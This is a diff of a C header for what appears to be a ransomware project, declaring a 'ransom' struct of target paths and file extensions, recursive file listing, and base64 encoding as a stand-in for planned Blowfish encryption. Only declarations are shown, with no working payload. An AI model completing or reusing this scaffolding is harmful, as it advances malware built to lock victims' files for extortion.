@@ -1,7 +1,11 @@
 #ifndef FOUR_NIGHTS
 #define FOUR_NIGHTS
 
-#include "blowfish.h"
+/**
+  * For real encryption, not base64
+  * #include "openssl/include/openssl/blowfish.h"
+ **/
+#include "openssl/include/openssl/pem.h"
 #include <dirent.h>
 #include <limits.h>
 #include <signal.h>
@@ -19,6 +23,7 @@
 /**
   * struct ransom_s - struct to store often used values
   * @root_path: string that represents the target filepath
+  * @file_ext_nontoken: string that contains all target file extensions
   * @file_extensions: double pointer to a list of file extensions as strings
   * @num_of_file_ext: number of file extensions
   * @os_info: pointer to a struct that contains info about the operating system
@@ -27,11 +32,13 @@
 typedef struct ransom_s
 {
 	char *root_path;
+	char *file_ext_nontoken;
 	char **file_extensions;
 	unsigned int num_of_file_ext;
 	struct utsname os_info;
 	struct node_s *target_files;
 } ransom_t;
+void free_ransom_struct(ransom_t *ransom);
 
 /* Linked list functions, etc*/
 /**
@@ -49,10 +56,11 @@ void free_list(node_t **head);
 node_t *add_node(char *str, struct node_s **head);
 
 /* String Functions */
-char **tokenizer(char *str, ransom_t *ransom);
+char *tokenizer(char *str, ransom_t *ransom);
 int my_strncmp(const char *s1, const char *s2, size_t n);
 size_t my_strlen(const char *s);
 char *my_strncat(char *dest, const char *src, size_t offset, size_t n);
+char *my_strtok_r(char *str, char *delim, char **saveptr);
 
 /* Search Functions */
 int binary_search(int *array, size_t size, int value);
@@ -66,8 +74,12 @@ void *recalloc(void *ptr, size_t old_size, size_t new_size);
 
 /* OS functions */
 node_t *recurse_ls(char *filename, ransom_t *ransom);
-char *read_file(const char *filepath, ransom_t *ransom, char **(*fxn)(char *, ransom_t *));
-int write_to_file(const char *filepath);
+size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *));
+int write_file(const char *filepath);
+
+/* Base64 POC */
+char *base64decode (const void *b64_decode_str, int decode_size);
+char *base64encode (const void *b64_encode_str, int encode_size);
 
 /* TODO if enough time */
 /* Recreate: */
@@ -77,7 +89,6 @@ void my_free(void *ptr);
 struct dirent *my_readdir(DIR *dirp);
 DIR *my_opendir(const char *name);
 ssize_t my_getline(char **lineptr, size_t *n, FILE *stream);
-char *my_strtok_r(char *str, const char *delim, char **saveptr);
 
 
 #endif
